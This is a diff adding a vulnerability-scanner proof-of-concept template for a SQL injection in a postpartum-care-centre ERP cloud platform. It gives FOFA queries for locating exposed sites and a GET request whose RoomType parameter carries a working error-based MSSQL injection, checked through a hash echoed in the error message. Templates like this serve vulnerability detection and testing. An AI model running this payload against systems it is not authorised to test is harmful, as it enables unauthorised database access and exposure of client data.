@@ -1,0 +1,18 @@
+id: poc-yaml-jintongfang-erp-bindroomlistdata-sqli
+info:
+  name: 月子会所ERP管理云平台 BindRoomListData SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 月子会所ERP管理云平台
+  fofa: body="月子护理ERP管理平台" || body="妈妈宝盒客户端.rar" || body="Page/Login/Login3.aspx"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /Page/SalerManager/ashx/BindRoomListData.ashx?RZParam=1&RoomID=1&RoomName=1&RoomStyle=1&RoomType=1%27%20and%201%3dconvert(int,sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}')))--&ddlFStoreID=1&IsShowCount=1
+  expression: "status_code == 500 && \ncontains(body,\"0x\" + t2) &&\ncontains(body,\"\
+    SqlException\") &&\nmatches(body,\"转换成数据类型(.*?)时失败\") &&\nmatches(body,\"在将(.*?)值\"\
+    )\n"
+transport: http
